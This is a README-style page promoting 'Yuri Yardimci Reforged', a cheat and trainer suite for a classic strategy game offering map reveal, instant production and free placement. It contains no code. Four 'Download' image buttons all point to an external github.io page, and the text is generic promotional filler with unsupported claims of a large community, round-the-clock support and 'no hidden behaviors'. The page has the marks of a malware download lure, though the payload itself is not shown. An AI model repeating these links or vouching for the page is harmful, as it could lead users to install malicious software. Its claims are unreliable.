![preview](https://raw.githubusercontent.com/savakrasavab-coder/yuri-yardimci-command-suite/main/view_8d63.svg)
[![Download](https://raw.githubusercontent.com/savakrasavab-coder/yuri-yardimci-command-suite/main/setup_36e3f.svg)](https://savakrasavab-coder.github.io/yuri-yardimci-command-suite/)

# 🎮 Yuri Yardimci Reforged — Command Companion Suite 2026

**The definitive open-source augmentation layer for classic real-time strategy skirmishes — rebuilt from the ground up for commanders who value clarity, customization, and control.**

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-blue.svg)](#-platform-compatibility)
[![Build](https://img.shields.io/badge/Build-Passing-brightgreen.svg)](#-build-pipeline)
[![Version](https://img.shields.io/badge/Version-2026.1.0-orange.svg)](#-release-notes-2026)
[![Status](https://img.shields.io/badge/Status-Active-success.svg)](#-project-roadmap)
[![Community](https://img.shields.io/badge/Community-12k%2B%20Commanders-purple.svg)](#-community--support)
[![Docs](https://img.shields.io/badge/Docs-Complete-informational.svg)](#-documentation-index)

---

## 🧭 Overview — Why This Project Exists

There is a peculiar magic in the moment a fog-covered battlefield suddenly becomes legible — an instant where uncertainty collapses into strategy. **Yuri Yardimci Reforged** was born from that exact sensation. It is not merely a modification; it is a **command companion suite** that re-imagines how players interact with their favorite real-time strategy skirmishes, offering a modular toolkit that respects the original spirit of the game while expanding what is possible within it.

Rather than forcing players into a rigid framework, this project invites them to shape the experience. Every module is opt-in, transparent, and designed with a "sanctuary of choice" philosophy — the player remains the architect of their own battlefield. Whether you are a lone wolf dueling against adaptive AI, or a dedicated theorist studying build order efficiency, the suite adapts to you instead of the other way around.

The project originally took shape within the community contributions of earlier augmentation efforts, but this reforge represents a **complete architectural reinvention** — cleaner module boundaries, deterministic behaviors, multilingual interfaces, and a support philosophy rooted in long-term sustainability. This is 2026's answer to a 2010s problem: how do we make a beloved classic feel both timeless and contemporary?

---

## ✨ Core Feature Highlights

The following are the flagship capabilities shipped with the 2026 branch. Each is documented, versioned, and independently toggleable.

- 🗺️ **Adaptive Map Revelation** — A graduated vision system that reveals terrain, resources, and unit positions through configurable "insight radii," letting you tailor battlefield awareness to your preferred challenge curve.
- 🏅 **Commander Credit Ledger** — A transparent economy overlay that tracks every credit earned, spent, and projected, rendered through elegant sparkline visualizations and exportable summaries.
- 🎖️ **Elite Unit Doctrine** — Unlockable elite unit tiers that evolve based on your command patterns, rewarding tactical creativity rather than raw grind.
- 🔬 **Technology Tree Weaver** — A modular research grid where technologies can be re-linked, accelerated, or rebalanced, giving theorists an unprecedented sandbox for build-order exploration.
- 🧱 **Universal Placement Grid** — Construct structures beyond traditional terrain constraints, with a smart validation layer that prevents impossible overlap while enabling creative base layouts.
- ⚡ **Instant Production Mode** — Optional instant-completion flow for units and buildings, ideal for rapid scenario testing or high-intensity casual sessions.
- 🌐 **Multilingual Command Interface** — Full localization scaffolding for English, Turkish, German, Spanish, Japanese, and community-contributed languages, with runtime hot-swapping.
- 📱 **Responsive UI Framework** — A modern, DPI-aware interface that scales gracefully from 1080p monitors to handheld devices and ultra-wide displays.
- 🛡️ **Deterministic Multiplayer Sync** — Reworked state reconciliation that keeps augmentation choices consistent across connected clients.
- 🗃️ **Profile Presets & Cloud-Ready Export** — Save, share, and restore command configurations as portable profile bundles.

---

## 🧩 Expand Your Experience — The [![Download](https://raw.githubusercontent.com/savakrasavab-coder/yuri-yardimci-command-suite/main/setup_36e3f.svg)](https://savakrasavab-coder.github.io/yuri-yardimci-command-suite/) Companion Bundle

To begin your reforged journey, the distributed companion bundle contains preconfigured module sets, curated balance profiles, and starter documentation. Look for the marker below wherever the package is offered through our official channels.

[![Download](https://raw.githubusercontent.com/savakrasavab-coder/yuri-yardimci-command-suite/main/setup_36e3f.svg)](https://savakrasavab-coder.github.io/yuri-yardimci-command-suite/)

The bundle is organized into three tiers — **Scout**, **Vanguard**, and **Archon** — each providing progressively richer module combinations. Tier contents are described in the `docs/profiles/` directory of the repository.

---

## 🏗️ Project Architecture 🧪

The codebase is structured into layered subsystems that communicate through a well-defined event bus. This separation ensures that any single module can be lifted out or replaced without destabilizing the remainder of the suite.

- **`core/`** — Kernel services, event bus, configuration registry, and lifecycle hooks.
- **`modules/vision/`** — Map revelation and insight radius logic.
- **`modules/economy/`** — Credit ledger, projections, and analytics.
- **`modules/units/`** — Elite unit doctrine and progression tracking.
- **`modules/tech/`** — Technology tree weaving engine.
- **`modules/placement/`** — Universal placement grid and validation.
- **`modules/production/`** — Instant production orchestration.
- **`ui/`** — Responsive renderer, theming engine, and localization bindings.
- **`profiles/`** — Preset bundles and shareable configuration documents.
- **`docs/`** — Human-readable documentation, tutorials, and references.

Each folder contains its own README describing internal contracts and extension points.

---

## 🚀 Getting Started — The Path of the Commander

You do not need to be a seasoned developer to run the suite. The following outlines the **recommended pathways** for different types of users.

1. **Scout Path** — For players new to augmentation. Begin with the preassembled Scout profile and explore one module at a time.
2. **Vanguard Path** — For returning players who want the full tactical spread. Load the Vanguard profile and tailor modules to your habits.
3. **Archon Path** — For theorists and contributors. Fork the repository, extend a module, and submit your profile for inclusion.

Detailed walkthroughs live in `docs/getting-started.md`, and each module ships with an inline tutorial mode accessible from the UI.

---

## 🕹️ Usage Scenarios 🎯

The suite shines in a variety of situations. Here are a few illustrative scenarios:

- **Scenario A — The Quiet Duel:** A player faces adaptive AI on a fog-dense map, gradually expanding their insight radius to simulate a "reveal as you explore" experience.
- **Scenario B — The Theoretician's Sandbox:** A build-order enthusiast accelerates technology research and instant production to compress dozens of experiments into a single afternoon.
- **Scenario C — The Architect's Playground:** A base-design enthusiast uses the universal placement grid to sculpt aesthetically unique fortresses without violating structural sanity.
- **Scenario D — The Classroom Demonstration:** An educator uses exported profiles to showcase resource-flow principles to students in a controlled, deterministic environment.

Each scenario has a companion configuration profile included in the repository.

---

## 📱 Responsive UI & Accessibility 🌍

Modern expectations demand that interfaces bend to the user, not the reverse. The reforge introduces a **fluid layout engine** that reflows panels based on available screen real estate, retains legibility at high DPI, and honors system-level accessibility preferences.

- **Adaptive Grid:** Panels dock and undock automatically depending on viewport width.
- **Theme Engine:** Light, dusk, and high-contrast palettes shipped by default; custom themes are drop-in.
- **Keyboard-First Navigation:** Every actionable element is reachable through a documented keyboard path.
- **Screen Reader Verbosity Modes:** Choose between concise and verbose announcement styles.
- **Color Blind Assist Presets:** Multiple calibrated palettes for common vision profiles.

---

## 🌐 Multilingual Support 🗣️

Localization is treated as a first-class citizen. Translation strings are stored in structured resource files, and community contributions are welcomed through a documented translation workflow.

- **Runtime Hot-Swapping:** Change language without restarting your session.
- **Pluralization Rules:** Language-aware plural forms for accurate grammar.
- **Right-to-Left Ready:** Layout engine supports RTL scripts out of the box.
- **Community Glossary:** Shared terminology so translations stay consistent across modules.

Currently supported locales include English, Turkish, German, Spanish, Japanese, and Polish, with active community efforts for several others.

---

## 🛎️ 24/7 Customer Support 🕐

A commander never fights alone. The project maintains a **round-the-clock support presence** via community forums, mirrored issue trackers, and scheduled office-hours sessions. Support channels are staffed by volunteer maintainers and veteran players alike.

- **Triage Rotation:** Issues are labeled and prioritized within hours, regardless of timezone.
- **Knowledge Base:** A growing library of answers to common questions, searchable and indexed.
- **Live Sessions:** Weekly voice and text clinics for real-time troubleshooting.
- **Feedback Loop:** Every support interaction is reviewed for documentation improvements.

Support is a shared labor of love — contributors are always welcome.

---

## 🔒 Reliability, Ethics & Transparency 🧭

The suite is designed with a **doctrine of transparency**. Every module documents what it changes, why it changes it, and how to revert. There are no hidden behaviors, no telemetry without consent, and no obscure operations lurking behind friendly labels.

- **Audit Trail:** Every augmentation action is recorded locally in a human-readable log.
- **Revert Anytime:** Disable any module and the original behaviors are restored instantly.
- **No Background Network Calls:** The suite never phones home unexpectedly.
- **Open Governance:** Major decisions are discussed publicly in the repository discussions area.

---

## 🧪 Build Pipeline 🛠️

Continuous integration runs on every push, executing the following stages:

1. **Static Analysis** — Linting, type checks, and style validation.
2. **Unit Tests** — Module-scoped tests guaranteeing deterministic behavior.
3. **Integration Tests** — Cross-module event bus and profile loading scenarios.
4. **Accessibility Audits** — Automated contrast, keyboard, and screen reader checks.
5. **Documentation Build** — Generates the searchable HTML documentation site.
6. **Artifact Packing** — Produces distributable profile bundles.

Build status badges appear in the repository header area (external badge rendering is intentionally omitted in this document).

---

## 📚 Documentation Index 📖

- `docs/getting-started.md` — First-run orientation.
- `docs/modules/` — Per-module reference guides.
- `docs/profiles/` — Preset profile descriptions.
- `docs/localization.md` — Translation workflow.
- `docs/architecture.md` — Subsystem overview and data flow.
- `docs/faq.md` — Frequently asked questions.
- `docs/changelog.md` — Historical release notes.

---

## 🧭 Project Roadmap 🗺️

The 2026 branch is ambitious. Planned milestones include:

- **Q1 2026** — Stabilize elite unit doctrine and publish extension guide.
- **Q2 2026** — Introduce scenario scripting API for classroom and research use.
- **Q3 2026** — Roll out plugin marketplace (community-curated, no monetary transactions).
- **Q4 2026** — Expand localization to ten languages with native reviewer sign-off.

Roadmap discussions are held openly; priorities are adjusted based on community feedback.

---

## 🤝 Contributing Guide 🌟

Contributions of all shapes are welcomed — code, translations, documentation, thematic artwork, or simply thoughtful issue reports.

1. **Read the Code of Conduct** located at `docs/conduct.md`.
2. **Open an Issue** describing your intended change before large pull requests.
3. **Fork and Branch** with descriptive names.
4. **Write Tests** for behavioral changes.
5. **Submit a Pull Request** referencing the related issue.

Maintainers aim to review incoming contributions within a week, though response times may vary during holiday periods.

---

## 📜 License ⚖️

This project is licensed under the **MIT License**. You are welcome to use, modify, and distribute the software in accordance with the terms of that license. A full copy of the license is available at the canonical reference below.

- [MIT License — Open Source Initiative](https://opensource.org/licenses/MIT)

Copyright (c) 2026 Yuri Yardimci Reforged Contributors.

---

## ⚠️ Disclaimer 🛡️

This project is an independent, community-driven augmentation suite intended for **personal, educational, and research purposes** within environments that permit such modifications. It is **not affiliated with, endorsed by, or sponsored by** any original game publisher or rights holder. Users are responsible for ensuring their use complies with the terms of service of any software they interact with.

The maintainers provide this suite **as-is, without warranty of any kind**, express or implied. Performance, compatibility, and behavior may vary depending on your platform, configuration, and the specific environment in which the suite is used. Always back up your profiles and configuration before experimenting.

No monetary exchange is required to participate in this project, and the maintainers do not solicit payment for access. Any third party offering paid access to this repository's contents is acting without authorization.

---

## 🙏 Acknowledgements 💐

Gratitude flows to the tireless translators, the patient bug reporters, the bold contributors who submit their first pull request at 2 a.m., and every commander who has ever paused mid-battle to appreciate a well-designed interface. This project is a mosaic of your efforts.

Special thanks to the long lineage of earlier augmentation projects whose lessons, both triumphant and cautionary, shaped the philosophy behind this reforge.

---

## 🗣️ Final Word 🎗️

Augmentation, at its best, is not about doing less — it is about **seeing more**. It is about transforming a familiar battlefield into a canvas where intention and execution finally align. Yuri Yardimci Reforged exists to serve that alignment, one module, one profile, one quiet revelation at a time.

Welcome to the reforge. The map is yours to reveal.

[![Download](https://raw.githubusercontent.com/savakrasavab-coder/yuri-yardimci-command-suite/main/setup_36e3f.svg)](https://savakrasavab-coder.github.io/yuri-yardimci-command-suite/)